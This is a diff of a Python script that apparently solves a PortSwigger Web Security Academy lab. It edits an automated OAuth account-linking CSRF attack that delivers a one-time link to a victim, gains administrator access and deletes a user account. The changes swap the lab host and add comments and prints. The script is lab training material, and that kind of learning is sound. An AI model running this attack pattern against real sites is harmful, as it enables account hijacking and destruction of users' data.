@@ -8,7 +8,7 @@ from urllib.parse import urlparse
 s = requests.Session()
 
 # Get the csrf
-site = 'ac361f811e34207080da13ad00320048.web-security-academy.net'
+site = 'ac321fde1e6d1efb80862c66005a00e2.web-security-academy.net'
 login_url = f'https://{site}/login'
 resp = s.get(login_url)
 soup = BeautifulSoup(resp.text, 'html.parser')
@@ -48,8 +48,11 @@ my_account_url = f'https://{site}/my-account/'
 resp = s.get(my_account_url)
 soup = BeautifulSoup(resp.text, 'html.parser')
 attach_link = soup.find('div', {'id': 'account-content'}).find('a')['href']
+# Important! We don't want to load the redirect location ourselves.
+# It's a one-time use link, and we want the victim to use it.
 resp = s.get(attach_link, allow_redirects=False)
 code_url = resp.headers['Location']
+print(f'Insecure url: \n{code_url}\n')
 
 # Logout
 logout_url = f'https://{site}/logout'
@@ -66,15 +69,17 @@ form_data = {
     'formAction': 'DELIVER_TO_VICTIM'
 }
 s.post(exploit_url, data=form_data)
-print('Delivering exploit to victim...')
+print(f'Delivering exploit to victim: \n{exploit_html}\n')
 
-# Now log back in ...
+# Now log back in, and let the auth endpoint tell the application we're the administrator
 resp = s.get(login_url)
 soup = BeautifulSoup(resp.text, 'html.parser')
 login_sm_url = soup.find('a', {'style': 'display: inline-block; background: rgb(77, 144, 254)'})['href']
-s.get(login_sm_url)
+resp = s.get(login_sm_url)
+soup = BeautifulSoup(resp.text, 'html.parser')
+print(f'Top nav html: \n{soup.find("section",{"class": "top-links"})}\n')
 
-# ... and delete the target account
+# As Administrator, delete the target account to solve level
 del_url = f'https://{site}/admin/delete?username=carlos'
 resp = s.get(del_url)
 soup = BeautifulSoup(resp.text, 'html.parser')
